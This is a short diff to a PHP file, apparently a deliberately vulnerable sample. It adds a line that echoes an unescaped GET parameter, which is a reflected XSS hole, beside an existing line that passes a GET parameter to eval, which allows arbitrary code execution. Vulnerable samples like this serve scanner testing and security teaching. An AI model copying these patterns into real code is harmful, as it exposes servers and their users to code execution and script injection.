@@ -1,6 +1,7 @@
 <?
 
 
+echo $_GET['asdf'];
 
 
 eval($_GET["XSS"]);
